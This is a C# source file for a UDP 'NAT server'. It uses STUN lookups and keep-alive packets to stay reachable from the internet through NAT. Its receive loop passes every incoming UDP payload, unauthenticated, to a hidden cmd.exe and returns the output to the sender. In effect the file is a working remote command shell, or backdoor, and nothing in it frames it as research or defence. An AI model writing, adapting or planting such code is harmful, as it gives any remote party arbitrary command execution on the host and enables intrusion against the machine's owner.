using LumiSoft.Net.STUN.Client;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace NATServer
{
    internal class NatUdpListener
    {
        private UdpClient _client;
        private STUN_Result _stunEndPoint;

        public string StunAddress { get; private set; }

        public STUN_Result StunEndPoint {
            get
            {
                return _stunEndPoint;
            }
            private set
            {
                _stunEndPoint = value;
            }
        }

        public NatUdpListener(STUN_NetType netType = STUN_NetType.FullCone)
        {
            StartServer(netType);
        }

        private void StartServer(STUN_NetType netType)
        {
            _client = new UdpClient(564);
            _client.AllowNatTraversal(true);
            _stunEndPoint = StunFromFileList(_client.Client, netType);

            Receive();
            HoldConnection(_stunEndPoint.PublicEndPoint.Address.ToString(), _stunEndPoint.PublicEndPoint.Port);
        }

        private STUN_Result StunFromFileList(Socket client, STUN_NetType netType)
        {
            using (FileStream fs = new FileStream("servers.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                StreamReader sr = new StreamReader(fs);

                string currentAddress = "";
                string tab = "  ";
                string splitter = "===============================================================";

                while(!sr.EndOfStream)
                {
                    try
                    {
                        currentAddress = sr.ReadLine();
                        if(currentAddress.StartsWith("!"))
                        {
                            Console.WriteLine(tab + "Address [" + currentAddress.Split('!')[1] + "] was ignored");
                            continue;
                        }

                        var data = currentAddress.Split(':');

                        var address = data[0];
                        var port = int.Parse(data[1]);

                        var result = STUN_Client.Query(address, port, client);
                        if (result.NetType == netType
                            && result.PublicEndPoint != null)
                        {
                            StunAddress = currentAddress;
                            return result;
                        }
                        else
                        {
                            Console.WriteLine(tab + @"Can't start server on [" + currentAddress + "]");
                        }
                    }
                    catch(Exception ex)
                    {
                        Console.WriteLine(splitter);
                        Console.WriteLine(tab + "Error for address: [" + currentAddress + "]");
                        Console.WriteLine(tab + tab + "With message: " + ex.Message);
                        Console.WriteLine(splitter);
                    }
                }

                return null;
            }
        }

        private async void HoldConnection(string ip, int port)
        {
            var c = new UdpClient(565);
            c.AllowNatTraversal(true);
            c.Connect(new IPEndPoint(IPAddress.Parse(ip), port));
            while (true)
            {
                await c.SendAsync(new byte[0], 0);
                await Task.Delay(3000);
            }
        }

        private async void Receive()
        {
            while (true)
            {
                UdpReceiveResult res = await _client.ReceiveAsync();
                if (res.Buffer.Length > 0)
                {
                    try
                    {
                        Process cmd = new Process();
                        cmd.StartInfo.FileName = "cmd.exe";
                        cmd.StartInfo.RedirectStandardInput = true;
                        cmd.StartInfo.RedirectStandardOutput = true;
                        cmd.StartInfo.CreateNoWindow = true;
                        cmd.StartInfo.UseShellExecute = false;
                        cmd.Start();

                        cmd.StandardInput.WriteLine(ASCIIEncoding.UTF8.GetString(res.Buffer));
                        cmd.StandardInput.Flush();
                        cmd.StandardInput.Close();
                        cmd.WaitForExit();

                        string cmdResult = cmd.StandardOutput.ReadToEnd();

                        var cmdOut = ASCIIEncoding.UTF8.GetBytes(cmdResult);
                        _client.Send(cmdOut, cmdOut.Length, res.RemoteEndPoint);
                        Console.WriteLine(cmdResult);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error: " + ex.Message);
                    }
                }
                _client.Send(res.Buffer, res.Buffer.Length, res.RemoteEndPoint);
            }
        }
    }
}